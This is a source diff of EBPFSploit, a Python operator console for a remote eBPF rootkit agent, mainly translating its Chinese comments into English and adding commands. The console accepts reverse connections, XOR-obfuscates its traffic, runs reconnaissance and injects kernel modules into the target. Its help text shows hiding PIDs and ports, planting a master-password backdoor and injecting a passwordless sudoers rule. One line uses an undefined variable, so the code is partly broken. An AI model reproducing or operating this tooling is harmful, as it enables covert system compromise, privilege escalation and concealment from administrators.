@@ -17,19 +17,27 @@ except ImportError:
 MAGIC = 0xDEADBEEF
 PSK = "__EBPFSPLOIT_PSK__"
 
-# ── 命令类型（与 Agent 对应）──────────────────────────────────
+# Directory where the script is located (fixed regardless of from where it is started)
+CONSOLE_DIR = os.path.dirname(os.path.abspath(__file__))
+MODULES_DIR = os.path.join(CONSOLE_DIR, "modules")
+
+# -- Command Types (corresponding with Agent) ----------------------------------
 CMD_LOAD   = 4
 CMD_UNLOAD = 5
 CMD_LIST   = 6
 CMD_UPDATE = 7
 RESP_MSG   = 8
 CMD_RECON  = 9
+CMD_GET    = 10
+CMD_DUMP_MAP = 11
+CMD_DELETE = 12
+CMD_CLEAR  = 13
 
-# ── cmd_payload 结构：4+4+4+4+32+96 = 144 bytes ──────────────
+# -- cmd_payload structure: 4+4+4+4+32+96 = 144 bytes ------------------------
 CMD_FMT  = "<IIII32s96s"
 CMD_SIZE = struct.calcsize(CMD_FMT)   # 144
 
-# ── 响应格式：uint32 长度前缀 + JSON 文本 ─────────────────────
+# -- Response format: uint32 length prefix + JSON text -----------------------
 RESP_LEN_FMT = "<I"
 
 
@@ -38,12 +46,12 @@ class EBPFSploit:
         self.host     = host
         self.port     = port
         self.sock     = None
-        self.current_mod   = None   # 当前选中的模块名（用于 use）
-        self.user_configs  = {}     # 待加载时的配置
+        self.current_mod   = None   # Currently selected module name (for 'use')
+        self.user_configs  = {}     # Configs to be loaded
         self.active_sessions: dict = {}  # {session_id: {name, mod_name, ...}}
-        self.recon_data: dict = {}        # Agent 侦察数据
+        self.recon_data: dict = {}        # Agent reconnaissance data
         self._resp_lock = threading.Lock()
-        self.state_file = ".ebpfsploit_sessions.json"
+        self.state_file = os.path.join(CONSOLE_DIR, ".ebpfsploit_sessions.json")
         self._load_state()
 
     def _load_state(self):
@@ -62,14 +70,14 @@ class EBPFSploit:
         except Exception:
             pass
 
-    # ── 连接 ─────────────────────────────────────────────────
+    # -- Connection -----------------------------------------------------------
     def connect(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            if self.host:  # 正向连接：console 主动连 Agent
+            if self.host:  # Forward connection: console actively connects to Agent
                 print(f"{Fore.CYAN}[*] Connecting to {self.host}:{self.port}...{Fore.WHITE}")
                 self.sock.connect((self.host, self.port))
-            else:  # 反向监听：console 等待 Agent 回连
+            else:  # Reverse listener: console waits for Agent to connect back
                 listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 listener.bind(('0.0.0.0', self.port))
@@ -113,7 +121,7 @@ class EBPFSploit:
             except Exception:
                 pass
 
-    # ── XOR 加解密 ───────────────────────────────────────────
+    # -- XOR Encryption/Decryption --------------------------------------------
     def _xor_crypt(self, data: bytes) -> bytes:
         psk = PSK.encode()
         psk_len = len(psk)
@@ -121,7 +129,7 @@ class EBPFSploit:
             return data
         return bytes(b ^ psk[i % psk_len] for i, b in enumerate(data))
 
-    # ── 发送一条 cmd_payload ──────────────────────────────────
+    # -- Send one cmd_payload --------------------------------------------------
     def _send_cmd(self, cmd_type, session_id=0, data_size=0,
                   aux=b'', config=b''):
         aux_b    = aux[:32].ljust(32, b'\x00')
@@ -138,7 +146,7 @@ class EBPFSploit:
             except Exception:
                 pass
 
-    # ── 读取一条 length-prefix JSON 响应 ─────────────────────
+    # -- Read one length-prefix JSON response ---------------------------------
     def _recv_resp(self, timeout=5.0) -> dict | None:
         self.sock.settimeout(timeout)
         try:
@@ -173,9 +181,9 @@ class EBPFSploit:
             data += chunk
         return data
 
-    # ── 从 ELF .metadata section 读取模块元数据 ──────────────
+    # -- Read module metadata from ELF .metadata section ----------------------
     def get_metadata(self, mod_name) -> dict | None:
-        path = f"modules/{mod_name}.bpf.o"
+        path = os.path.join(MODULES_DIR, f"{mod_name}.bpf.o")
         if not os.path.exists(path):
             return None
         try:
@@ -186,27 +194,27 @@ class EBPFSploit:
                     raw = sec.data().rstrip(b'\x00').decode('utf-8')
                     return json.loads(raw)
         except Exception as e:
-            print(f"{Fore.RED}[-] 解析 metadata 失败 ({mod_name}): {e}{Fore.WHITE}")
+            print(f"{Fore.RED}[-] Failed to parse metadata ({mod_name}): {e}{Fore.WHITE}")
         return None
 
-    # ── list ─────────────────────────────────────────────────
+    # -- list -----------------------------------------------------------------
     def list_modules(self):
-        if not os.path.exists('modules/'):
-            os.makedirs('modules/')
-            print(f"{Fore.YELLOW}[!] modules/ 目录不存在，已创建。{Fore.WHITE}")
+        if not os.path.exists(MODULES_DIR):
+            os.makedirs(MODULES_DIR)
+            print(f"{Fore.YELLOW}[!] modules/ directory does not exist, created.{Fore.WHITE}")
             return
         print(f"\n{Fore.CYAN}Available Modules{Fore.WHITE}")
         print("=================")
         print(f"{'Name':<20} {'Description'}")
         print(f"{'-'*20} {'-'*45}")
         found = False
-        for fn in os.listdir('modules/'):
+        for fn in sorted(os.listdir(MODULES_DIR)):
             if fn.endswith('.bpf.o'):
                 found = True
                 name = fn.replace('.bpf.o', '')
                 meta = self.get_metadata(name)
                 desc = meta.get('desc', 'No description') if meta else 'Error reading metadata'
-                # 检查可用性
+                # Check availability
                 avail, missing = self.check_module_available(meta) if meta else (True, [])
                 if avail:
                     status = f"{Fore.GREEN}[OK]{Fore.WHITE}"
@@ -219,21 +227,22 @@ class EBPFSploit:
             print(f"{Fore.YELLOW}  [No modules found]{Fore.WHITE}")
         print()
 
-    # ── recon 相关 ────────────────────────────────────────────
+    # -- recon related --------------------------------------------------------
     REQUIRE_LABELS = {
-        'is_root':       '需要 root 权限',
-        'tracefs':       '需要 tracefs（tracepoint 支持）',
-        'probe_write':   '需要 bpf_probe_write_user 支持',
-        'uprobe':        '需要 uprobe 支持',
-        'kprobe':        '需要 kprobe 支持',
-        'xdp':           '需要 XDP 支持（CAP_NET_ADMIN）',
-        'lsm_bpf':       '需要内核 LSM BPF 支持',
-        'cap_mac_admin':  '需要 CAP_MAC_ADMIN',
-        'cap_net_admin':  '需要 CAP_NET_ADMIN',
+        'is_root':       'Requires root privileges',
+        'tracefs':       'Requires tracefs (tracepoint support)',
+        'probe_write':   'Requires bpf_probe_write_user support',
+        'uprobe':        'Requires uprobe support',
+        'kprobe':        'Requires kprobe support',
+        'kprobe_override': 'Requires kprobe override (CONFIG_BPF_KPROBE_OVERRIDE)',
+        'xdp':           'Requires XDP support (CAP_NET_ADMIN)',
+        'lsm_bpf':       'Requires kernel LSM BPF support',
+        'cap_mac_admin':  'Requires CAP_MAC_ADMIN',
+        'cap_net_admin':  'Requires CAP_NET_ADMIN',
     }
 
     def _request_recon(self):
-        """连接后自动获取 Agent 环境侦察信息"""
+        """Automatically get Agent environment reconnaissance info after connection"""
         try:
             self._send_cmd(CMD_RECON)
             resp = self._recv_resp(timeout=5.0)
@@ -241,9 +250,9 @@ class EBPFSploit:
                 self.recon_data = resp['recon']
                 self._display_recon()
             else:
-                print(f"{Fore.YELLOW}[!] Agent 未返回侦察数据（旧版本？）{Fore.WHITE}")
+                print(f"{Fore.YELLOW}[!] Agent did not return recon data (old version?){Fore.WHITE}")
         except Exception as e:
-            print(f"{Fore.YELLOW}[!] 获取侦察数据失败: {e}{Fore.WHITE}")
+            print(f"{Fore.YELLOW}[!] Failed to get recon data: {e}{Fore.WHITE}")
 
     def _display_recon(self):
         r = self.recon_data
@@ -273,8 +282,8 @@ class EBPFSploit:
         print()
 
     def check_module_available(self, meta: dict) -> tuple:
-        """检查模块是否因权限/特性不足而不可用.
-        返回 (available: bool, missing: list[str])"""
+        """Check if module is unavailable due to insufficient privileges/features.
+        Returns (available: bool, missing: list[str])"""
         if not self.recon_data or 'requires' not in meta:
             return True, []
 
@@ -296,17 +305,17 @@ class EBPFSploit:
         return len(missing) == 0, missing
 
     def cmd_recon(self):
-        """手动请求侦察数据"""
+        """Manually request recon data"""
         self._request_recon()
 
-    # ── show options ─────────────────────────────────────────
+    # -- show options ---------------------------------------------------------
     def show_options(self):
         if not self.current_mod:
-            print(f"{Fore.YELLOW}[!] 请先 use <module>{Fore.WHITE}")
+            print(f"{Fore.YELLOW}[!] Please 'use <module>' first{Fore.WHITE}")
             return
         meta = self.get_metadata(self.current_mod)
         if not meta:
-            print(f"{Fore.RED}[-] 无法读取 metadata{Fore.WHITE}")
+            print(f"{Fore.RED}[-] Unable to read metadata{Fore.WHITE}")
             return
         print(f"\nModule : {self.current_mod}")
         print(f"Desc   : {meta.get('desc', 'N/A')}\n")
@@ -318,12 +327,12 @@ class EBPFSploit:
             print(f"{'-'*18} {'-'*22} {'-'*30}")
             for key, details in opts.items():
                 val  = self.user_configs.get(key, details[0])
-                # 转义换行符以便正常显示
-                val_disp = repr(str(val))[1:-1]  # 去掉引号
+                # Escape newlines for proper display
+                val_disp = repr(str(val))[1:-1]  # Remove quotes
                 desc = details[1] if len(details) > 1 else ''
                 print(f"{key:<18} {val_disp:<22} {desc}")
         else:
-            print(f"{Fore.YELLOW}  [此模块无加载时配置项，使用 run 直接加载]{Fore.WHITE}")
+            print(f"{Fore.YELLOW}  [No load-time configuration items for this module, use 'run' directly]{Fore.WHITE}")
 
         maps_info = meta.get('maps', {})
         if maps_info:
@@ -333,7 +342,7 @@ class EBPFSploit:
             for mname, minfo in maps_info.items():
                 kt = minfo.get('key_type', '?')
                 vt = minfo.get('value_type', '?')
-                # 生成 update 示例
+                # Generate update example
                 if vt == 'str':
                     example = f'update <sess> {mname} "value"'
                 elif kt in ('u16',):
@@ -345,32 +354,44 @@ class EBPFSploit:
                 print(f"{mname:<22} {kt:<10} {vt:<10} {example}")
         print()
 
-    # ── run_module ─────────────────────────────────────────
+    # -- run_module -----------------------------------------------------------
     def run_module(self):
         if not self.current_mod:
-            print(f"{Fore.YELLOW}[!] 请先 use <module>{Fore.WHITE}")
+            print(f"{Fore.YELLOW}[!] Please 'use <module>' first{Fore.WHITE}")
             return
 
-        mod_path = f"modules/{self.current_mod}.bpf.o"
+        mod_path = os.path.join(MODULES_DIR, f"{self.current_mod}.bpf.o")
         if not os.path.exists(mod_path):
-            print(f"{Fore.RED}[-] 找不到 {mod_path}{Fore.WHITE}")
+            print(f"{Fore.RED}[-] Cannot find {mod_path}{Fore.WHITE}")
             return
 
         with open(mod_path, 'rb') as f:
             blob = f.read()
 
-        # 构建初始 config（取第一个 option 的值）
+        # Build initial config (take the value of the first option)
         meta = self.get_metadata(self.current_mod)
         config_buf = bytearray(96)
         if meta and 'options' in meta:
             first_key = next(iter(meta['options']), None)
             if first_key:
-                val = self.user_configs.get(first_key, meta['options'][first_key][0])
-                val = str(val).encode('utf-8').decode('unicode_escape')  # 处理 \n → 真换行
-                if val.lstrip('-').isdigit():
-                    config_buf[:4] = struct.pack('<I', int(val))
+                default_val_str = str(meta['options'][first_key][0])
+                val = self.user_configs.get(first_key, default_val_str)
+                val = str(val).encode('utf-8').decode('unicode_escape')  # Handle \n → real newline
+
+                # For shadow_walker and target, we might have multiple space-separated values ("1234 5678")
+                # We'll pack the FIRST value into config_buf so it's active immediately,
+                # and hold the remaining values to update via cmd_update right after load.
+                val_parts = val.replace(',', ' ').split()
+                first_val = val_parts[0] if val_parts else ""
+                
+                if self.current_mod == 'shadow_walker' and first_key == 'target':
+                    # specifically encode the STRING into config_buf for shadow_walker
+                    enc = first_val.encode('utf-8')[:8]
+                    config_buf[:8] = enc.ljust(8, b'\x00')
+                elif is_numeric_option and first_val.lstrip('-').isdigit():
+                    config_buf[:4] = struct.pack('<I', int(first_val))
                 else:
-                    enc = val.encode('utf-8')[:63]
+                    enc = first_val.encode('utf-8')[:63]
                     config_buf[:len(enc)] = enc
 
         mod_name_b = self.current_mod.encode('utf-8')
@@ -384,14 +405,14 @@ class EBPFSploit:
 
         resp = self._recv_resp(timeout=10.0)
         if resp is None:
-            print(f"{Fore.RED}[-] 未收到响应{Fore.WHITE}")
+            print(f"{Fore.RED}[-] No response received{Fore.WHITE}")
             return
 
         if resp.get('ok'):
             sid   = resp['session_id']
             progs = resp.get('programs', 0)
             
-            # 初始化 session 的 map_state 记录
+            # Initialize session map_state recording
             map_state = {}
             if meta and 'maps' in meta:
                 for mname in meta['maps']:
@@ -409,20 +430,31 @@ class EBPFSploit:
             self._save_state()
             print(f"{Fore.GREEN}[+] Session {sid} opened  "
                   f"({progs} programs hooked){Fore.WHITE}")
+                  
+            # If there were multiple initial targets, push the rest now seamlessly!
+            if meta and 'options' in meta:
+                first_key = next(iter(meta['options']), None)
+                if first_key and first_key == 'target':
+                    default_val_str = str(meta['options'][first_key][0])
+                    raw_val = self.user_configs.get(first_key, default_val_str)
+                    val_parts = raw_val.replace(',', ' ').split()
+                    if len(val_parts) > 1:
+                        # Silently update all of them since cmd_update issues CMD_CLEAR
+                        self.cmd_update([str(sid), "target"] + val_parts)
         else:
-            print(f"{Fore.RED}[-] 加载失败: {resp.get('error','unknown')}{Fore.WHITE}")
+            print(f"{Fore.RED}[-] Load failed: {resp.get('error','unknown')}{Fore.WHITE}")
 
-    # ── sessions ─────────────────────────────────────────────
+    # -- sessions -------------------------------------------------------------
     def cmd_sessions(self, silent=False):
         self._send_cmd(CMD_LIST)
         resp = self._recv_resp()
         if resp is None:
-            if not silent: print(f"{Fore.RED}[-] 未收到响应{Fore.WHITE}")
+            if not silent: print(f"{Fore.RED}[-] No response received{Fore.WHITE}")
             return
 
         sessions = resp.get('sessions', [])
         
-        # 同步 agent 状态与本地状态
+        # Synchronize agent state with local state
         active_ids = {s['id'] for s in sessions}
         for sid in list(self.active_sessions.keys()):
             if sid not in active_ids:
@@ -434,7 +466,7 @@ class EBPFSploit:
                 self.active_sessions[s['id']]['name'] = s.get('name', '?')
             else:
                 self.active_sessions[s['id']] = s
-                # 尝试通过通信接口从 Agent 拉取 Array Map 的关键字段补偿本地记录
+                # Attempt to pull key fields of Array Map from Agent via communication interface to compensate local records
                 pulled = self._pull_map_state_from_agent(s['id'], s['name'])
                 if pulled:
                     self.active_sessions[s['id']]['map_state'] = pulled
@@ -480,13 +512,13 @@ class EBPFSploit:
                                 k_bytes = bytes.fromhex(entry['k'])
                                 v_bytes = bytes.fromhex(entry['v'])
                                 
-                                # 解析 key (通常是 u32)
+                                # Parse key (usually u32)
                                 try:
                                     k_val = str(struct.unpack("<I", k_bytes[:4])[0])
                                 except Exception:
                                     k_val = entry['k']
                                     
-                                # 解析 value
+                                # Parse value
                                 try:
                                     if val_type == 'str':
                                         parsed_v = v_bytes.split(b'\x00')[0].decode('utf-8', 'replace')
@@ -508,7 +540,7 @@ class EBPFSploit:
                 self.sock.settimeout(None)
         return map_state
 
-    # ── unload ─────────────────────────────────────────────────
+    # -- unload ---------------------------------------------------------------
     def cmd_unload(self, session_id: int):
         self._send_cmd(CMD_UNLOAD, session_id=session_id)
         resp = self._recv_resp()
@@ -523,13 +555,12 @@ class EBPFSploit:
         else:
             print(f"{Fore.RED}[-] 卸载失败: {resp.get('error','unknown')}{Fore.WHITE}")
 
-    # ── update ─────────────────────────────────────────────────
+    # -- update ---------------------------------------------------------------
     # update <session_id> <map_name> <key_arg> [value_arg]
     # 自动根据 map 的 key_size 打包 key；value 缺省为 uint32(1)
     def cmd_update(self, args: list[str]):
         if len(args) < 2:
-            print("Usage: update <session_id> <map_name> <value>  (For Array maps like master_password)")
-            print("       update <session_id> <map_name> <key>    (For Hash maps like hidden_pids)")
+            print("Usage: update <session_id> <map_name> <val1> [val2] ...")
             return
 
         try:
@@ -539,95 +570,84 @@ class EBPFSploit:
             return
 
         map_name = args[1]
-
-        # 从本地缓存 / 新查询获取 session 的模块名 → 读取 metadata 获取 map 信息
         sess_info = self.active_sessions.get(sid)
-        key_size  = 4   # 默认 u32
-        val_size  = 4
-        val_type  = 'u32'
+        if not sess_info:
+            print(f"{Fore.RED}[-] 会话 ID {sid} 不存在{Fore.WHITE}")
+            return
 
-        if sess_info:
-            meta = self.get_metadata(sess_info.get('name', ''))
-            if meta:
-                map_meta = meta.get('maps', {}).get(map_name, {})
-                key_size = map_meta.get('key_size', 4)
-                val_size = map_meta.get('value_size', 4)
-                val_type = map_meta.get('value_type', 'u32')
+        meta = self.get_metadata(sess_info.get('name', ''))
+        map_meta = meta.get('maps', {}).get(map_name, {}) if meta else {}
+        key_size = map_meta.get('key_size', 4)
+        val_size = map_meta.get('value_size', 4)
+        val_type = map_meta.get('value_type', 'u32')
 
-        # 如果是字符串类型的 value，通常是 Array Map (如 inject_payload, master_password)
-        # key 永远是 0，所有的后续参数拼起来作为 value
+        # 1. Process Array Map (val_type == 'str'): merge remaining arguments into a single string
         if val_type == 'str':
             if len(args) < 3:
-                print(f"{Fore.RED}[-] 错误：模块 {map_name} 需要一个字符串参数作为 value{Fore.WHITE}")
+                print(f"{Fore.RED}[-] 错误：模块 {map_name} 需要一个参数{Fore.WHITE}")
                 return
             val_str = ' '.join(args[2:])
-            # 移除两边可能多余的引号
-            if val_str.startswith('"') and val_str.endswith('"'):
-                val_str = val_str[1:-1]
+            if val_str.startswith('"') and val_str.endswith('"'): val_str = val_str[1:-1]
+            val_str = val_str.encode('utf-8').decode('unicode_escape')
+            
             key_bytes = struct.pack('<I', 0)
             value_bytes = val_str.encode('utf-8', 'replace').ljust(val_size, b'\x00')[:val_size]
-        else:
-            # Hash Map: key 是参数，value 默认是 1
-            if len(args) < 3:
-                print(f"{Fore.RED}[-] 错误：模块 {map_name} 缺少 key 参数{Fore.WHITE}")
-                return
-            key_arg = args[2]
-            val_arg = args[3] if len(args) > 3 else None
             
-            try:
-                key_int = int(key_arg)
-                fmt_map = {1: '<B', 2: '<H', 4: '<I', 8: '<Q'}
-                key_bytes = struct.pack(fmt_map.get(key_size, '<I'), key_int)
-            except ValueError:
-                key_bytes = struct.pack('<I', 0)
-                
-            if val_arg is None:
-                value_bytes = struct.pack('<I', 1)
-            elif str(val_arg).lstrip('-').isdigit():
-                value_bytes = struct.pack('<I', int(val_arg))
-            else:
-                value_bytes = val_arg.encode('utf-8', 'replace').ljust(val_size, b'\x00')[:val_size]
-
-        # config = key_bytes + value_bytes（填充至 96 字节）
-        config_buf = bytearray(96)
-        config_buf[:len(key_bytes)]                       = key_bytes
-        config_buf[len(key_bytes):len(key_bytes)+len(value_bytes)] = value_bytes
-
-        self._send_cmd(CMD_UPDATE,
-                       session_id=sid,
-                       aux=map_name.encode('utf-8'),
-                       config=bytes(config_buf))
-        resp = self._recv_resp()
-        if resp is None:
-            print(f"{Fore.RED}[-] 未收到响应{Fore.WHITE}")
-            return
-        if resp.get('ok'):
-            print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' 更新成功{Fore.WHITE}")
-            
-            # 本地记录更新状态，供 view session 展示
-            if sess_info:
-                if 'map_state' not in sess_info:
-                    sess_info['map_state'] = {}
-                if map_name not in sess_info['map_state']:
-                    sess_info['map_state'][map_name] = {}
-                
-                # 保存人类可读的展示值
-                if val_type == 'str':
-                    disp_key = "0"
-                    disp_val = val_str
-                else:
-                    disp_key = str(key_int) if 'key_int' in locals() else key_arg
-                    if val_arg is None:
-                        disp_val = "1"
-                    else:
-                        disp_val = str(val_arg)
-                
-                sess_info['map_state'][map_name][disp_key] = disp_val
+            cfg = bytearray(96)
+            cfg[:4] = key_bytes
+            cfg[4:4+len(value_bytes)] = value_bytes
+            self._send_cmd(CMD_UPDATE, sid, aux=map_name.encode('utf-8'), config=bytes(cfg))
+            resp = self._recv_resp()
+            if resp and resp.get('ok'):
+                print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' 更新成功{Fore.WHITE}")
+                if 'map_state' not in sess_info: sess_info['map_state'] = {}
+                sess_info['map_state'][map_name] = {"0": val_str}
                 self._save_state()
-        else:
-            print(f"{Fore.RED}[-] 更新失败: {resp.get('error','unknown')}{Fore.WHITE}")
+            return
 
-    # ── show session ───────────────────────────────────────────
+        # 2. Process Hash Map: supports multi-value update 1 target 80 443
+        values = args[2:]
+        if not values:
+            print(f"{Fore.RED}[-] 错误：缺少要更新的值{Fore.WHITE}")
+            return
+
+        self._send_cmd(CMD_CLEAR, sid, aux=map_name.encode('utf-8'))
+        self._recv_resp() 
+
+        fmt_map = {1: '<B', 2: '<H', 4: '<I', 8: '<Q'}
+        success_count = 0
+        new_map_state = {}
+        for val_str in values:
+            try:
+                if map_name == 'target' and sess_info.get('name') == 'shadow_walker':
+                    key_bytes = val_str.encode('utf-8').ljust(8, b'\x00')
+                    key_int = val_str
+                elif '.' in val_str:
+                    key_int = struct.unpack("<I", socket.inet_aton(val_str))[0]
+                    key_bytes = struct.pack(fmt_map.get(key_size, '<I'), key_int)
+                else:
+                    key_int = int(val_str, 0)
+                    key_bytes = struct.pack(fmt_map.get(key_size, '<I'), key_int)
+                value_bytes = struct.pack('<I', 1).ljust(val_size, b'\x00')[:val_size]
+                cfg = bytearray(96)
+                cfg[:len(key_bytes)] = key_bytes
+                cfg[len(key_bytes):len(key_bytes)+len(value_bytes)] = value_bytes
+                self._send_cmd(CMD_UPDATE, sid, aux=map_name.encode('utf-8'), config=bytes(cfg))
+                if (resp := self._recv_resp()) and resp.get('ok'):
+                    success_count += 1
+                    new_map_state[str(key_int)] = "1"
+            except Exception as e:
+                print(f"{Fore.YELLOW}[!] 无法解析参数 '{val_str}': {e}{Fore.WHITE}")
+
+        if success_count > 0:
+            print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' 更新完成 ({success_count} 个元素同步){Fore.WHITE}")
+            if 'map_state' not in sess_info: sess_info['map_state'] = {}
+            sess_info['map_state'][map_name] = new_map_state
+            self._save_state()
+        return
+
+    # -- show session ---------------------------------------------------------
+
     def cmd_show_session(self, sid_str: str):
         try:
             sid = int(sid_str)
@@ -653,43 +673,59 @@ class EBPFSploit:
             print(f"  {Fore.GREEN}[Map: {mname}]{Fore.WHITE}")
             for k, v in entries.items():
                 if isinstance(v, str) and ('\n' in v or len(v) > 20):
-                    # 对长字符串（比如 inject_payload）进行友好展示
+                    # Friendly display for long strings (e.g. inject_payload)
                     disp_v = repr(v)[1:-1]
                     print(f"    Key {k:<6} => \"{disp_v}\"")
                 else:
                     print(f"    Key {k:<6} => {v}")
         print()
 
-    # ── 主交互 shell ─────────────────────────────────────────
+    # -- Main interactive shell -----------------------------------------------
     def _setup_readline(self):
         commands = ['help', 'list', 'use', 'show', 'set', 'run',
-                    'sessions', 'unload', 'update', 'recon', 'exit']
+                    'sessions', 'unload', 'update', 'recon', 'clear', 'kill', 'exit']
         show_subs = ['options', 'session']
 
         def completer(text, state):
             buf = readline.get_line_buffer().lstrip()
             parts = buf.split()
             n = len(parts)
-            # 第一个词：命令补全
+            # First word: command completion
             if n == 0 or (n == 1 and not buf.endswith(' ')):
                 matches = [c + ' ' for c in commands if c.startswith(text)]
-            # 第二个词
+            # Second word
             elif parts[0] == 'use':
-                mods = [fn.replace('.bpf.o','') for fn in os.listdir('modules/') if fn.endswith('.bpf.o')] if os.path.isdir('modules/') else []
+                mods = [fn.replace('.bpf.o','') for fn in os.listdir(MODULES_DIR) if fn.endswith('.bpf.o')] if os.path.isdir(MODULES_DIR) else []
                 matches = [m + ' ' for m in mods if m.startswith(text)]
             elif parts[0] == 'show':
                 matches = [s + ' ' for s in show_subs if s.startswith(text)]
-            elif parts[0] in ('unload', 'update') or (parts[0] == 'show' and n >= 2 and parts[1] == 'session'):
+            elif parts[0] in ('unload', 'kill') or (parts[0] == 'show' and len(parts) >= 2 and parts[1] == 'session'):
                 sids = [str(s) + ' ' for s in self.active_sessions.keys()]
                 matches = [s for s in sids if s.startswith(text)]
-            elif parts[0] == 'update' and n >= 3:
-                # 补全 map 名称
-                sid = int(parts[1]) if parts[1].isdigit() else 0
-                sess = self.active_sessions.get(sid)
-                if sess:
-                    meta = self.get_metadata(sess['name'])
-                    if meta and 'maps' in meta:
-                        matches = [m + ' ' for m in meta['maps'] if m.startswith(text)]
+            elif parts[0] == 'update':
+                if (n == 1 and buf.endswith(' ')) or (n == 2 and not buf.endswith(' ')):
+                    # Complete session_id
+                    sids = [str(s) + ' ' for s in self.active_sessions.keys()]
+                    matches = [s for s in sids if s.startswith(text)]
+                elif (n == 2 and buf.endswith(' ')) or (n == 3 and not buf.endswith(' ')):
+                    # Complete map_name
+                    sid = int(parts[1]) if parts[1].isdigit() else 0
+                    sess = self.active_sessions.get(sid)
+                    if sess:
+                        meta = self.get_metadata(sess['name'])
+                        if meta and 'maps' in meta:
+                            matches = [m + ' ' for m in meta['maps'] if m.startswith(text)]
+                        else:
+                            matches = []
+                    else:
+                        matches = []
+                else:
+                    matches = []
+            elif parts[0] == 'set' and n >= 2:
+                if self.current_mod:
+                    meta = self.get_metadata(self.current_mod)
+                    if meta and 'options' in meta:
+                        matches = [k + ' ' for k in meta['options'] if k.startswith(text)]
                     else:
                         matches = []
                 else:
@@ -701,8 +737,8 @@ class EBPFSploit:
         readline.set_completer(completer)
         readline.parse_and_bind('tab: complete')
         readline.set_completer_delims(' ')
-        # 尝试加载历史
-        self._histfile = '.ebpfsploit_history'
+        # Try to load history
+        self._histfile = os.path.join(CONSOLE_DIR, '.ebpfsploit_history')
         try:
             readline.read_history_file(self._histfile)
         except FileNotFoundError:
@@ -730,36 +766,36 @@ class EBPFSploit:
                     print(f"""
 {Fore.CYAN}Core Commands{Fore.WHITE}
 =============
-  help                          显示此帮助
-  list                          列出 modules/ 目录中所有可用模块
-  use <module>                  选择模块
-  show options                  显示当前模块的配置项及运行时 Map 说明
-  set <KEY> <val>               设置加载前的配置参数
-  run                           将当前模块注入到目标内核
+  help                          Show this help
+  list                          List all available modules in modules/ directory
+  use <module>                  Select module
+  show options                  Display configuration items and runtime Map details of current module
+  set <KEY> <val>               Set configuration parameters before loading
+  run                           Inject current module into target kernel
 
 {Fore.CYAN}Session Commands{Fore.WHITE}
 ================
-  sessions                      查看当前所有在运行的模块会话
-  show session <id>             查看某个会话当前的参数配置状态（本地记录）
-  unload <session_id>           热卸载指定会话的模块（解除所有 Hook）
+  sessions                      View all currently running module sessions
+  show session <id>             View current parameter configuration of a session (local record)
+  unload <session_id>           Hot-unload module of specified session (removes all Hooks)
   update <sess> <map> <key> [val]
-                                运行时更新已运行模块的 BPF Map
+                                Update BPF Map of running module at runtime
 
-    {Fore.YELLOW}Hash Map（添加条目，key=要添加的项，val 默认为 1）{Fore.WHITE}
-      update 1 hidden_pids 1234           隐藏 PID 1234
-      update 2 hidden_ports 4444          隐藏端口 4444
-      update 3 protected_inodes 123456    保护 inode
+    {Fore.YELLOW}Hash Map (Add entry, key=item to add, val defaults to 1){Fore.WHITE}
+      update 1 hidden_pids 1234           Hide PID 1234
+      update 2 hidden_ports 4444          Hide port 4444
+      update 3 protected_inodes 123456    Protect inode
 
-    {Fore.YELLOW}Array Map（修改值，key 自动设为 0）{Fore.WHITE}
-      update 1 master_password "newpass"  修改万能密码
+    {Fore.YELLOW}Array Map (Modify value, key automatically set to 0){Fore.WHITE}
+      update 1 master_password "newpass"  Modify master password
       update 2 inject_payload "\\nuser ALL=(ALL:ALL) NOPASSWD:ALL\\n"
-                                          修改 sudoers 注入规则
+                                          Modify sudoers injection rule
 
 {Fore.CYAN}Recon Commands{Fore.WHITE}
 ================
-  recon                         重新获取并显示 Agent 环境侦察信息
+  recon                         Refresh and display Agent environment reconnaissance info
 
-  exit                          退出控制台
+  exit                          Exit console
 """)
 
                 elif act == "list":
@@ -770,12 +806,12 @@ class EBPFSploit:
                         print(f"Usage: use <module>")
                         continue
                     name = parts[1]
-                    if os.path.exists(f"modules/{name}.bpf.o"):
+                    if os.path.exists(os.path.join(MODULES_DIR, f"{name}.bpf.o")):
                         self.current_mod  = name
                         self.user_configs = {}
                         print(f"{Fore.GREEN}[*] Module '{name}' selected.{Fore.WHITE}")
                     else:
-                        print(f"{Fore.RED}[-] modules/{name}.bpf.o not found{Fore.WHITE}")
+                        print(f"{Fore.RED}[-] {name}.bpf.o not found in modules/{Fore.WHITE}")
 
                 elif act == "show":
                     if len(parts) > 1 and parts[1] == "options":
@@ -790,12 +826,12 @@ class EBPFSploit:
                         print(f"Usage: set <KEY> <value>")
                         continue
                     if self.current_mod:
-                        k = parts[1].upper()
+                        k = parts[1]
                         v = ' '.join(parts[2:])
-                        # 去除两端引号
+                        # Remove surrounding quotes
                         if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
                             v = v[1:-1]
-                        # 处理转义序列: \n → 真换行, \t → 真tab
+                        # Handle escape sequences: \n → real newline, \t → real tab
                         v = v.encode('utf-8').decode('unicode_escape')
                         self.user_configs[k] = v
                         print(f"  {k} => {repr(v)}")
@@ -808,14 +844,15 @@ class EBPFSploit:
                 elif act == "sessions":
                     self.cmd_sessions()
 
-                elif act == "unload":
+                elif act == "unload" or act == "kill":
                     if len(parts) < 2:
-                        print("Usage: unload <session_id>")
+                        print(f"Usage: {act} <session_id> [session_id2 ...]")
                         continue
-                    try:
-                        self.cmd_unload(int(parts[1]))
-                    except ValueError:
-                        print(f"{Fore.RED}[-] session_id 必须是整数{Fore.WHITE}")
+                    for p in parts[1:]:
+                        try:
+                            self.cmd_unload(int(p))
+                        except ValueError:
+                            print(f"{Fore.RED}[-] session_id 必须是整数: {p}{Fore.WHITE}")
 
                 elif act == "update":
                     self.cmd_update(parts[1:])
@@ -823,13 +860,16 @@ class EBPFSploit:
                 elif act == "recon":
                     self.cmd_recon()
 
+                elif act == "clear":
+                    os.system('cls' if os.name == 'nt' else 'clear')
+
                 elif act == "exit":
                     self._save_history()
                     print(f"{Fore.CYAN}[*] Closing session...{Fore.WHITE}")
                     break
 
                 else:
-                    print(f"{Fore.RED}[-] 未知命令: {act}. 输入 'help' 查看帮助{Fore.WHITE}")
